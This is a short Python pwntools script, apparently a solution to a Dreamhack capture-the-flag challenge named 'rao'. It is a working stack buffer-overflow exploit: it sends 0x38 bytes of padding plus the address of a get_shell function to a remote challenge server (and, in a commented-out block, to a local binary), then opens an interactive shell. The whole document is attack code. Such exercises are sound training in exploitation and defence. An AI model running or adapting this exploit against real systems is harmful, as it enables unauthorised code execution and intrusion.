from pwn import *

# # For local file
# p = process('./rao')
# get_shell = 0x4006aa

# payload = b"A" * 0x38 + p64(get_shell)
# p.sendline(payload)
# p.interactive()

p = remote('host3.dreamhack.games', 24203)
get_shell = 0x4006aa
payload = b"A" * 0x38 + p64(get_shell)
p.sendline(payload)
p.interactive()
